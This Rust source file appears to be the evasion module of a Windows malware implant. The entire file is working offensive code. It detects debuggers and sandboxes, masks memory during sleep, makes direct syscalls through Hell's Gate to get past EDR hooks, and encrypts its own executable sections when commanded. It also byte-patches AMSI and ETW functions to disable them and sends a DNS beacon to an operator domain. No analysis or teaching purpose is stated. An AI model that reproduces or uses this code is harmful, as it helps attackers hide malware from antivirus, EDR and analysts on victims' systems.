/// Evasion module: sandbox detection, sleep masking, working hours, DNS canary.

/// Score-based sandbox check. Exits silently (exit code 0) if sandbox indicators detected.
pub fn sandbox_check() {
    use windows_sys::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
    use windows_sys::Win32::System::SystemInformation::{
        GetSystemInfo, GlobalMemoryStatusEx, MEMORYSTATUSEX, SYSTEM_INFO,
    };
    use windows_sys::Win32::Storage::FileSystem::GetDiskFreeSpaceExW;

    unsafe {
        if IsDebuggerPresent() != 0 {
            std::process::exit(0);
        }

        let mut score: u32 = 0;

        let mut si: SYSTEM_INFO = std::mem::zeroed();
        GetSystemInfo(&mut si);
        if si.dwNumberOfProcessors < 2 {
            score += 1;
        }

        let mut ms: MEMORYSTATUSEX = std::mem::zeroed();
        ms.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
        GlobalMemoryStatusEx(&mut ms);
        if ms.ullTotalPhys < 512u64 * 1024 * 1024 {
            score += 3;
        }

        let c_drive: Vec<u16> = "C:\\\0".encode_utf16().collect();
        let mut free_caller = 0u64;
        let mut total = 0u64;
        GetDiskFreeSpaceExW(
            c_drive.as_ptr(),
            &mut free_caller,
            &mut total,
            std::ptr::null_mut(),
        );
        if total > 0 && total < 10u64 * 1024 * 1024 * 1024 {
            score += 1;
        }

        if score >= 4 {
            std::process::exit(0);
        }
    }

    let username = std::env::var("USERNAME")
        .unwrap_or_default()
        .to_ascii_lowercase();
    let sandbox_names = [
        "sandbox", "malware", "virus", "analyst", "cuckoo", "tester", "vm-", "vbox",
    ];
    if sandbox_names.iter().any(|n| username.contains(n)) {
        std::process::exit(0);
    }
}

/// Returns true if the current local time falls within the configured working-hours window.
/// Format: "HH:MM-HH:MM". Handles overnight windows, e.g. "22:00-06:00".
pub fn in_working_hours(spec: &str) -> bool {
    if spec.is_empty() {
        return true;
    }
    let parts: Vec<&str> = spec.split('-').collect();
    if parts.len() != 2 {
        return true;
    }
    let parse_hhmm = |s: &str| -> Option<u32> {
        let c: Vec<&str> = s.split(':').collect();
        if c.len() != 2 {
            return None;
        }
        let h: u32 = c[0].parse().ok()?;
        let m: u32 = c[1].parse().ok()?;
        Some(h * 60 + m)
    };
    let start_min = match parse_hhmm(parts[0]) {
        Some(v) => v,
        None => return true,
    };
    let end_min = match parse_hhmm(parts[1]) {
        Some(v) => v,
        None => return true,
    };

    use windows_sys::Win32::Foundation::SYSTEMTIME;
    use windows_sys::Win32::System::SystemInformation::GetLocalTime;

    let mut st: SYSTEMTIME = unsafe { std::mem::zeroed() };
    unsafe { GetLocalTime(&mut st); }
    let now_min = u32::from(st.wHour) * 60 + u32::from(st.wMinute);

    if start_min <= end_min {
        now_min >= start_min && now_min < end_min
    } else {
        now_min >= start_min || now_min < end_min
    }
}

/// Sleep masking: XOR non-exec PE sections during sleep to hide strings/globals from
/// memory scanners, then sleep via indirect NtDelayExecution (bypasses EDR hooks).
///
/// Safety notes:
/// - SSN is read to a stack-local BEFORE masking so it survives .data XOR.
/// - .idata/.pdata/.xdata/.reloc/.tls/.rsrc are always skipped.
/// - The Vec for section list is heap-allocated before XOR; heap regions
///   are separate from .data/.rdata and are unaffected.
/// - saved[] is a fixed stack array to avoid heap ops during the masked window.
pub fn sleep_masked(ms: u64) {
    // Copy SSN to stack before any XOR — GATES lives in .data which may be masked.
    let ssn = crate::hells_gate::delay_ssn();
    let mut interval: i64 = -(ms as i64 * 10_000); // negative = relative 100ns units

    unsafe {
        use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;
        use windows_sys::Win32::System::Memory::VirtualProtect;

        let base = GetModuleHandleW(std::ptr::null()) as usize;
        if base == 0 {
            do_nt_delay(ssn, &mut interval);
            return;
        }

        // Build section list (heap alloc happens here, before any XOR).
        let sections = collect_mask_sections(base);

        // Fixed stack array for saved protections — no heap during masked window.
        let mut saved = [(0usize, 0usize, 0u32); 24];
        let mut n = 0usize;

        // Pass 1: XOR sections and change protection to PAGE_READWRITE.
        for &(ptr, size) in &sections {
            if n >= 24 { break; }
            let mut old = 0u32;
            if VirtualProtect(ptr as *const _, size, 0x04, &mut old) != 0 {
                xor_region(ptr, size);
                saved[n] = (ptr, size, old);
                n += 1;
            }
        }

        // Indirect syscall — SSN and interval are on the stack, no .data read needed.
        do_nt_delay(ssn, &mut interval);

        // Pass 2: un-XOR and restore original protections.
        for i in 0..n {
            let (ptr, size, old) = saved[i];
            let mut tmp = 0u32;
            if VirtualProtect(ptr as *const _, size, 0x04, &mut tmp) != 0 {
                xor_region(ptr, size);
                VirtualProtect(ptr as *const _, size, old, &mut tmp);
            }
        }
    }
}

// ── Sleep masking helpers ─────────────────────────────────────────────────────

const XOR_KEY: u8 = 0xA7;

#[inline]
unsafe fn xor_region(ptr: usize, size: usize) {
    let slice = std::slice::from_raw_parts_mut(ptr as *mut u8, size);
    for b in slice.iter_mut() {
        *b ^= XOR_KEY;
    }
}

/// Execute NtDelayExecution via direct `syscall` instruction (Hell's Gate).
/// All inputs are stack-locals so this is safe to call while PE data sections are XOR'd.
#[inline(never)]
unsafe fn do_nt_delay(ssn: u32, interval: &mut i64) {
    use std::arch::asm;
    let p = interval as *mut i64;
    asm!(
        "mov r10, rcx",
        "syscall",
        in("eax") ssn,
        in("rcx") 0usize,   // Alertable = FALSE
        in("rdx") p,
        lateout("rcx") _,
        lateout("r11") _,
        options(nostack),
    );
}

/// Collect sections eligible for XOR masking during sleep.
/// Skips: executable sections, .idata, .pdata, .xdata, .reloc, .rsrc, .tls.
unsafe fn collect_mask_sections(base: usize) -> Vec<(usize, usize)> {
    let mut out = Vec::new();
    let e_lfanew = *(base.wrapping_add(0x3c) as *const u32) as usize;
    let nt = base + e_lfanew;
    if *(nt as *const u32) != 0x0000_4550 { return out; }
    let num  = *(nt.wrapping_add(6) as *const u16) as usize;
    let optsz = *(nt.wrapping_add(20) as *const u16) as usize;
    let sec0 = nt + 4 + 20 + optsz;
    for i in 0..num {
        let sec   = sec0 + i * 40;
        let name  = std::slice::from_raw_parts(sec as *const u8, 8);
        let vsz   = *(sec.wrapping_add(8)  as *const u32) as usize;
        let vaddr = *(sec.wrapping_add(12) as *const u32) as usize;
        let chars = *(sec.wrapping_add(36) as *const u32);
        if vsz == 0 || vaddr == 0 { continue; }
        // Skip exec sections (code).
        if chars & 0x2000_0000 != 0 { continue; }
        // Skip sections that contain runtime-critical tables.
        if sec_name_is(name, b".idata") { continue; } // IAT
        if sec_name_is(name, b".pdata") { continue; } // SEH
        if sec_name_is(name, b".xdata") { continue; } // unwind
        if sec_name_is(name, b".reloc") { continue; } // base relocations
        if sec_name_is(name, b".rsrc")  { continue; } // resources
        if sec_name_is(name, b".tls")   { continue; } // TLS callbacks
        out.push((base + vaddr, vsz));
    }
    out
}

fn sec_name_is(name: &[u8], prefix: &[u8]) -> bool {
    name.len() >= prefix.len() && name[..prefix.len()] == *prefix
}

// ── On-demand fluctuation (MEM_FLUCTUATE command) ────────────────────────────

/// XOR all executable PE sections with a key byte (toggle encryption in-place).
/// Used by the MEM_FLUCTUATE command for manual on-demand masking.
pub fn fluctuate_sections(key: u8) {
    use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;
    use windows_sys::Win32::System::Memory::VirtualProtect;

    unsafe {
        let base = GetModuleHandleW(std::ptr::null()) as usize as *mut u8;
        if base.is_null() { return; }
        let e_lfanew = *base.add(0x3c).cast::<i32>() as usize;
        let nt_base  = base.add(e_lfanew);
        if *nt_base.cast::<u32>() != 0x0000_4550 { return; }
        let num_sections  = *nt_base.add(6).cast::<u16>() as usize;
        let opt_header_sz = *nt_base.add(20).cast::<u16>() as usize;
        let sections_start = nt_base.add(4 + 20 + opt_header_sz);
        for i in 0..num_sections {
            let sec             = sections_start.add(i * 40);
            let virt_size       = *sec.add(8).cast::<u32>() as usize;
            let virt_addr       = *sec.add(12).cast::<u32>() as usize;
            let characteristics = *sec.add(36).cast::<u32>();
            if characteristics & 0x2000_0000 != 0 && virt_size > 0 {
                let ptr = base.add(virt_addr);
                let mut old = 0u32;
                if VirtualProtect(ptr as *const _, virt_size, 0x04, &mut old) != 0 {
                    let slice = std::slice::from_raw_parts_mut(ptr, virt_size);
                    for b in slice.iter_mut() { *b ^= key; }
                    let mut tmp = 0u32;
                    VirtualProtect(ptr as *const _, virt_size, old, &mut tmp);
                }
            }
        }
    }
}

// ── AMSI / ETW patch ─────────────────────────────────────────────────────────

/// Byte-patch AmsiScanBuffer, AmsiScanString (AMSI bypass) and EtwEventWrite.
/// Patch bytes: xor eax,eax; ret = [0x31, 0xC0, 0xC3]
/// Uses NtProtectVirtualMemory (indirect syscall) — no VirtualProtect in IAT.
pub fn patch_amsi() {
    const PATCH: [u8; 3] = [0x31, 0xC0, 0xC3];
    unsafe {
        use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress, LoadLibraryA};
        // Load amsi.dll (no-op if already present — required before CLR/PS execution)
        let amsi = LoadLibraryA(b"amsi.dll\0".as_ptr());
        if amsi != 0 {
            for sym in [b"AmsiScanBuffer\0".as_ref(), b"AmsiScanString\0".as_ref()] {
                let f = GetProcAddress(amsi, sym.as_ptr())
                    .map(|p| p as *const () as usize)
                    .unwrap_or(0);
                if f != 0 { write_patch(f, &PATCH); }
            }
        }
        let ntdll_w: Vec<u16> = "ntdll.dll\0".encode_utf16().collect();
        let ntdll = GetModuleHandleW(ntdll_w.as_ptr());
        if ntdll != 0 {
            let f = GetProcAddress(ntdll, b"EtwEventWrite\0".as_ptr())
                .map(|p| p as *const () as usize)
                .unwrap_or(0);
            if f != 0 { write_patch(f, &PATCH); }
        }
    }
}

unsafe fn write_patch(addr: usize, patch: &[u8]) {
    let mut base = addr as *mut u8;
    let mut sz   = patch.len();
    let mut old  = 0u32;
    if crate::hells_gate::nt_protect_virtual_memory(
        usize::MAX, &mut base as *mut *mut u8, &mut sz, 0x40, &mut old
    ) >= 0 {
        std::ptr::copy_nonoverlapping(patch.as_ptr(), addr as *mut u8, patch.len());
        crate::hells_gate::nt_protect_virtual_memory(
            usize::MAX, &mut base as *mut *mut u8, &mut sz, old, &mut old
        );
    }
}

// ── DNS canary ────────────────────────────────────────────────────────────────

/// Fire a DNS canary by resolving "beacon.<domain>".
pub fn dns_canary_check(domain: &str) {
    if domain.is_empty() {
        return;
    }
    let lookup = format!("beacon.{}\0", domain);

    use windows_sys::Win32::Networking::WinSock::{
        freeaddrinfo, getaddrinfo, WSAStartup, ADDRINFOA, WSADATA,
    };

    unsafe {
        let mut wsa_data: WSADATA = std::mem::zeroed();
        WSAStartup(0x0202, &mut wsa_data);

        let mut hints: ADDRINFOA = std::mem::zeroed();
        hints.ai_family = 0;

        let mut result: *mut ADDRINFOA = std::ptr::null_mut();
        getaddrinfo(
            lookup.as_ptr(),
            std::ptr::null(),
            &hints,
            &mut result,
        );
        if !result.is_null() {
            freeaddrinfo(result);
        }
    }
}
